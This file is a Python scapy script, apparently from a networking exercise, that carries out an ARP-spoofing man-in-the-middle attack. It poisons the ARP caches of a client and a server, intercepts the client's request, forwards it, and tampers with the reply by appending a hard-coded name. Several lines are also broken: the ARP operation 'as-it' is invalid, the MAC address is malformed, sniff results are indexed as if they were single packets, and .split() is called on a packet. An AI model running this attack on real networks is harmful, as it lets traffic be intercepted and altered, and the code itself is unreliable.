# CREATOR: HASHEM
from scapy import *
from scapy.layers.inet import IP
from scapy.layers.l2 import ARP, Ether
from scapy.packet import Raw
from scapy.sendrecv import sniff, send, sr1

MY_MAC = 'B0:10:41:28:6C:855'
NAME = 'ariel haser'


def client_filter(pack):
    return Raw in pack and pack[Raw].load.isdigit()


def server_filter(pack):
    if Raw in pack:
        ans_list = pack[Raw].load.split()
        return len(ans_list) > 1 and ans_list[0].isdigit()
    return False


def client_filter_adv(pack):
    return Ether in pack and pack[Ether].dst == MY_MAC and client_filter(pack)


def poisoning_arp():
    pack_client = sniff(count=1, lfilter=client_filter)
    pack_server = sniff(count=1, lfilter=server_filter)
    # create client ARP message
    client_arp = ARP(op='as-it', psrc=pack_server[IP].src, hwdst=pack_client[Ether].src, pdst=pack_client[IP].src) / IP(dst=pack_client[IP].src)
    # create server ARP message
    server_arp = ARP(op='as-it', psrc=pack_client[IP].src, hwdst=pack_server[Ether].src,
                     pdst=pack_server[IP].src) / IP(dst=pack_server[IP].src)
    send(client_arp)
    send(server_arp)


def main():
    poisoning_arp()
    pack_client_rec = sniff(count=1, lfilter=client_filter_adv)
    pack_server_sen = IP(src=pack_client_rec[IP].src)/Raw(load=pack_client_rec[Raw].load)
    pack_server_rec = sr1(pack_server_sen)
    pack_client_sen = IP(src=pack_server_rec[IP].src)/Raw(load=pack_server_rec.split()[0] + " " + NAME)
    send(pack_client_sen)


if __name__ == '__main__':
    main()